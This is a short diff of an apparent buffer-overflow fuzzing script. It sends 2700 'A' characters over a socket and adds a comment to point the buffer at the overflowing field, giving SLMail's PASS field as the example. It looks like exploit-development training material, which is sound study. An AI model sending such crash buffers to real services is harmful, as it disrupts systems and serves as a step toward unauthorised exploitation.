@@ -8,4 +8,4 @@ lenFromFuzz = 2700 #get this from fuzzing
 buf = ""
 buf += "A"*lenFromFuzz  
 buf += "\n"  
-s.send(buf)
+s.send(buf) #make sure to modify this so it actually reflects where the buffer overflow takes place.  For example the PASS field for slmail
